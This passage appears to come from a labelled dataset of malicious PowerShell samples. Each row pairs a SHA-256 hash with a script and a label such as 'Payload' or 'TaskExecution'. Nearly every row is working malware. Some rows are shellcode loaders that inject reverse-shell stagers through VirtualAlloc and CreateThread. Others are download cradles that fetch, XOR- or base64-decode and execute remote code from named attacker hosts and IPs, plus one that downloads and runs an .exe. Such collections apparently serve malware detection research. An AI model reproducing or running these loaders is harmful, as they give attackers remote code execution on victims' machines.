6,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb5,0x3f,0xec,0x26,0x68,0x02,0x00,0x00,0x7b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
a7c019e91cf82bd9e093dc1e4cd5c8461b1e7a0bf6a27f374d206717dbec9d0c,"
$code = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = ;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

",Payload
7cfd8d4f70696d1369eb1a3707a740186099c1bbb000739989c2d73f16a97c5d,"
[SYSTEm.Net.ServicePOintMaNAGer]::ExPeCt100COntInue = 0;$wc=NEW-ObJEct SySTEm.Net.WeBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEadERS.ADd('User-Agent',$u);$wc.ProxY = [SysTEm.NET.WeBREQuEST]::DEFAUlTWeBProxy;$wc.ProXY.CreDenTIalS = [SYsTEm.NEt.CReDENtiALCache]::DefAUlTNETWorkCredEntIalS;$K='563b21c9be06f2141e162c1c0cc5e7d1';$I=0;[chAr[]]$B=([cHar[]]($wc.DoWnloaDStRiNg(""https://msauth.net/index.asp"")))|%{$_-bXOR$k[$i++%$K.LEnGTH]};IEX ($B-jOIN'')

",Payload
bad473fe82e14892e6af3b8384b560dc8a9cc4b91ad5fe8fd6e1a0df34af7940,"
$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
while($true){
	try{
		$wc.headers.add('user-agent',$u);
		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
	}
	catch{
		sleep 180;
	}
}

",TaskExecution
46a454f5dbcdbac5a259b59d9c23aa3726f21be0a803e049ebfaf8f950f31ad4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x8e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
c572b043e1e64984f73eaf1e551b0df747d6b9d2048831db276478772851e074,"
$Wc=NEw-ObjEct SySTem.Net.WEbClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRs.ADD('User-Agent',$u);$wc.PROXY = [SYSTEm.NET.WEBReqUEst]::DEFaUltWebPROxy;$wc.ProXY.CrEDENtiALS = [SYStEM.NeT.CREdenTIALCaCHe]::DEFAULTNetWorkCRedentiALS;$K='rA32Fp:I!*ds$l,xZk9[?5QC~u;K-vNw';$i=0;[chAR[]]$B=([chAr[]]($wC.DoWNloAdStRinG(""http://159.203.89.248:80/index.asp"")))|%{$_-bXoR$k[$I++%$k.LENGtH]};IEX ($B-JOIN'')

",Payload
9001bde96ce7f1346833f352b5bcc84cc7ae17c1622dff39fb57d0744fcf0743,"
$CT8Y = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $CT8Y -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x82,0x9f,0x1f,0x7c,0xd9,0xc2,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31,0x47,0x13,0x03,0x47,0x13,0x83,0xc7,0x86,0x7d,0xea,0x80,0x6e,0x03,0x15,0x79,0x6e,0x64,0x9f,0x9c,0x5f,0xa4,0xfb,0xd5,0xcf,0x14,0x8f,0xb8,0xe3,0xdf,0xdd,0x28,0x70,0xad,0xc9,0x5f,0x31,0x18,0x2c,0x51,0xc2,0x31,0x0c,0xf0,0x40,0x48,0x41,0xd2,0x79,0x83,0x94,0x13,0xbe,0xfe,0x55,0x41,0x17,0x74,0xcb,0x76,0x1c,0xc0,0xd0,0xfd,0x6e,0xc4,0x50,0xe1,0x26,0xe7,0x71,0xb4,0x3d,0xbe,0x51,0x36,0x92,0xca,0xdb,0x20,0xf7,0xf7,0x92,0xdb,0xc3,0x8c,0x24,0x0a,0x1a,0x6c,0x8a,0x73,0x93,0x9f,0xd2,0xb4,0x13,0x40,0xa1,0xcc,0x60,0xfd,0xb2,0x0a,0x1b,0xd9,0x37,0x89,0xbb,0xaa,0xe0,0x75,0x3a,0x7e,0x76,0xfd,0x30,0xcb,0xfc,0x59,0x54,0xca,0xd1,0xd1,0x60,0x47,0xd4,0x35,0xe1,0x13,0xf3,0x91,0xaa,0xc0,0x9a,0x80,0x16,0xa6,0xa3,0xd3,0xf9,0x17,0x06,0x9f,0x17,0x43,0x3b,0xc2,0x7f,0xa0,0x76,0xfd,0x7f,0xae,0x01,0x8e,0x4d,0x71,0xba,0x18,0xfd,0xfa,0x64,0xde,0x02,0xd1,0xd1,0x70,0xfd,0xda,0x21,0x58,0x39,0x8e,0x71,0xf2,0xe8,0xaf,0x19,0x02,0x15,0x7a,0xb7,0x07,0x81,0x45,0xe0,0x02,0xd0,0x2e,0xf3,0x12,0xd0,0x85,0x7a,0xf4,0x84,0x89,0x2c,0xa9,0x64,0x7a,0x8d,0x19,0x0c,0x90,0x02,0x45,0x2c,0x9b,0xc8,0xee,0xc6,0x74,0xa5,0x47,0x7e,0xec,0xec,0x1c,0x1f,0xf1,0x3a,0x59,0x1f,0x79,0xc9,0x9d,0xd1,0x8a,0xa4,0x8d,0x85,0x7a,0xf3,0xec,0x03,0x84,0x29,0x9a,0xab,0x10,0xd6,0x0d,0xfc,0x8c,0xd4,0x68,0xca,0x12,0x26,0x5f,0x41,0x9a,0xb2,0x20,0x3d,0xe3,0x52,0xa1,0xbd,0xb5,0x38,0xa1,0xd5,0x61,0x19,0xf2,0xc0,0x6d,0xb4,0x66,0x59,0xf8,0x37,0xdf,0x0e,0xab,0x5f,0xdd,0x69,0x9b,0xff,0x1e,0x5c,0x1d,0xc3,0xc8,0x98,0x6b,0x2d,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$TbY=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($TbY.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$TbY,0,0,0);for (;;){Start-sleep 60};

",Payload
d6613cb4f5f3dd0374f5af727cb8d34274f7c67f9fe98662beabd25494cee4c0,"
$i = 0; $k = '1234'; IEX((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/is.txt'));Test-Querty -Querty ([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/pl.txt')) | %{ $_ -bXor $k[$i++ % $k.length] }) -Force

",Payload
ee9db34d2a631ffde5de442538b91f2349c04bbc56ef9a51a9d9121891e2025f,"
(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/vosa/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
64cb09f5d2977fa107c9ca889d156a2cb98d4b029f27aa3bd6daa170d1327ce3,"
$bxX = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $bxX -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xa7,0xbb,0x26,0x99,0xd9,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x6a,0x0f,0x03,0x6a,0xa8,0x59,0xd3,0x65,0x5e,0x1f,0x1c,0x96,0x9e,0x40,0x94,0x73,0xaf,0x40,0xc2,0xf0,0x9f,0x70,0x80,0x55,0x13,0xfa,0xc4,0x4d,0xa0,0x8e,0xc0,0x62,0x01,0x24,0x37,0x4c,0x92,0x15,0x0b,0xcf,0x10,0x64,0x58,0x2f,0x29,0xa7,0xad,0x2e,0x6e,0xda,0x5c,0x62,0x27,0x90,0xf3,0x93,0x4c,0xec,0xcf,0x18,0x1e,0xe0,0x57,0xfc,0xd6,0x03,0x79,0x53,0x6d,0x5a,0x59,0x55,0xa2,0xd6,0xd0,0x4d,0xa7,0xd3,0xab,0xe6,0x13,0xaf,0x2d,0x2f,0x6a,0x50,0x81,0x0e,0x43,0xa3,0xdb,0x57,0x63,0x5c,0xae,0xa1,0x90,0xe1,0xa9,0x75,0xeb,0x3d,0x3f,0x6e,0x4b,0xb5,0xe7,0x4a,0x6a,0x1a,0x71,0x18,0x60,0xd7,0xf5,0x46,0x64,0xe6,0xda,0xfc,0x90,0x63,0xdd,0xd2,0x11,0x37,0xfa,0xf6,0x7a,0xe3,0x63,0xae,0x26,0x42,0x9b,0xb0,0x89,0x3b,0x39,0xba,0x27,0x2f,0x30,0xe1,0x2f,0x9c,0x79,0x1a,0xaf,0x8a,0x0a,0x69,0x9d,0x15,0xa1,0xe5,0xad,0xde,0x6f,0xf1,0xd2,0xf4,0xc8,0x6d,0x2d,0xf7,0x28,0xa7,0xe9,0xa3,0x78,0xdf,0xd8,0xcb,0x12,0x1f,0xe5,0x19,0x8e,0x1a,0x71,0x62,0xe7,0x24,0x89,0x0a,0xfa,0x26,0x98,0x96,0x73,0xc0,0xca,0x76,0xd4,0x5d,0xaa,0x26,0x94,0x0d,0x42,0x2d,0x1b,0x71,0x72,0x4e,0xf1,0x1a,0x18,0xa1,0xac,0x73,0xb4,0x58,0xf5,0x08,0x25,0xa4,0x23,0x75,0x65,0x2e,0xc0,0x89,0x2b,0xc7,0xad,0x99,0xdb,0x27,0xf8,0xc0,0x4d,0x37,0xd6,0x6f,0x71,0xad,0xdd,0x39,0x26,0x59,0xdc,0x1c,0x00,0xc6,0x1f,0x4b,0x1b,0xcf,0xb5,0x34,0x73,0x30,0x5a,0xb5,0x83,0x66,0x30,0xb5,0xeb,0xde,0x60,0xe6,0x0e,0x21,0xbd,0x9a,0x83,0xb4,0x3e,0xcb,0x70,0x1e,0x57,0xf1,0xaf,0x68,0xf8,0x0a,0x9a,0x68,0xc4,0xdc,0xe2,0x1e,0x24,0xdd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$MRu=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($MRu.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$MRu,0,0,0);for (;;){Start-sleep 60};

",Payload
a18138efe3e6b58addb0f2fb2f04f1dee72d4619bc631ee406fcc61e1ae9e7e7,"
$1 = '$c = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + ""\\syswow64\\WindowsPowerShell\\v1.0\\powershell"";$cmd = ""-nop -noni -enc "";iex ""& $x86 $cmd $e""}else{$cmd = ""-nop -noni -enc"";iex ""& powershell $cmd $e"";}

",Payload
4ad2836fe63d5e5d4f0de6f01c1ac3fede3f1ad86fd434a3db4d6da845e37115,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x3c,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
93202cdb320079bf04bc8d6bf5253a3c4490600405d6f64b6adb7143bdb0081e,"
$o4m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $o4m -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x42,0x73,0x9f,0x7a,0xd9,0xc5,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x4e,0x31,0x5f,0x15,0x83,0xc7,0x04,0x03,0x5f,0x11,0xe2,0xb7,0x8f,0x77,0xf8,0x37,0x70,0x88,0x9d,0xbe,0x95,0xb9,0x9d,0xa4,0xde,0xea,0x2d,0xaf,0xb3,0x06,0xc5,0xfd,0x27,0x9c,0xab,0x29,0x47,0x15,0x01,0x0f,0x66,0xa6,0x3a,0x73,0xe9,0x24,0x41,0xa7,0xc9,0x15,0x8a,0xba,0x08,0x51,0xf7,0x36,0x58,0x0a,0x73,0xe4,0x4d,0x3f,0xc9,0x34,0xe5,0x73,0xdf,0x3c,0x1a,0xc3,0xde,0x6d,0x8d,0x5f,0xb9,0xad,0x2f,0xb3,0xb1,0xe4,0x37,0xd0,0xfc,0xbf,0xcc,0x22,0x8a,0x3e,0x05,0x7b,0x73,0xec,0x68,0xb3,0x86,0xed,0xad,0x74,0x79,0x98,0xc7,0x86,0x04,0x9a,0x13,0xf4,0xd2,0x2f,0x80,0x5e,0x90,0x97,0x6c,0x5e,0x75,0x41,0xe6,0x6c,0x32,0x06,0xa0,0x70,0xc5,0xcb,0xda,0x8d,0x4e,0xea,0x0c,0x04,0x14,0xc8,0x88,0x4c,0xce,0x71,0x88,0x28,0xa1,0x8e,0xca,0x92,0x1e,0x2a,0x80,0x3f,0x4a,0x47,0xcb,0x57,0xbf,0x65,0xf4,0xa7,0xd7,0xfe,0x87,0x95,0x78,0x54,0x00,0x96,0xf1,0x72,0xd7,0xd9,0x2b,0xc2,0x47,0x24,0xd4,0x32,0x41,0xe3,0x80,0x62,0xf9,0xc2,0xa8,0xe9,0xf9,0xeb,0x7c,0xbd,0xa9,0x43,0x2f,0x7d,0x1a,0x24,0x9f,0x15,0x70,0xab,0xc0,0x05,0x7b,0x61,0x69,0x2d,0x97,0x8a,0x96,0xad,0xfa,0xe5,0xf9,0xd9,0x97,0x9c,0x6b,0x44,0x1f,0x71,0x10,0xe2,0xb1,0xfe,0xf6,0x84,0x28,0x75,0x07,0x30,0x1a,0x5d,0x33,0x40,0xa3,0x4b,0xb0,0x00,0x40,0x1e,0xc2,0xd0,0x10,0xdc,0xcc,0xc1,0xbc,0x69,0x2a,0x8b,0x2c,0x3c,0xe4,0x23,0xd4,0x65,0x7e,0xd2,0x19,0xb0,0xfa,0xd4,0x92,0x37,0xfa,0x9a,0x52,0x3d,0xe8,0x4a,0x93,0x08,0x52,0xdc,0xac,0xa6,0xf9,0xe0,0x38,0x4d,0xa8,0xb7,0xd4,0x4f,0x8d,0xff,0x7a,0xaf,0xf8,0x74,0xb2,0x25,0x43,0xe2,0xbb,0xa9,0x43,0xf2,0xed,0xa3,0x43,0x9a,0x49,0x90,0x17,0xbf,0x95,0x0d,0x04,0x6c,0x00,0xae,0x7d,0xc1,0x83,0xc6,0x83,0x3c,0xe3,0x48,0x7b,0x6b,0xf5,0xb5,0xaa,0x55,0x83,0xd7,0x6e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ib9l=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ib9l.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ib9l,0,0,0);for (;;){Start-sleep 60};

",Payload
c75d4d65ae3649248df29a16b9df56cd5ca94b647d16e9988322d4b58ab641df,"
[SySteM.Net.SeRvicePOiNTMaNAger]::ExpEcT100CoNtiNuE = 0;$wC=NEw-ObjecT SYstem.Net.WebCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadErS.AdD('User-Agent',$u);$WC.PRoxY = [SysTem.Net.WeBREqUesT]::DEfAULTWeBPRoXy;$wc.PRoxy.CReDentiALs = [SYsTeM.Net.CreDENTialCAcHE]::DEFAulTNEtWORKCreDEnTIaLs;$K='0c88028bf3aa6a6a143ed846f2be1ea4';$I=0;[chAr[]]$B=([char[]]($Wc.DOWNLoaDSTrinG(""http://chgvaswks045.efgz.efg.corp:888/index.asp"")))|%{$_-BXor$K[$i++%$k.Length]};IEX ($B-JoIn'')

",Payload
4321515ccb8b771331ff9306173c028db5a17623223be461b6f4624232cfecc1,"
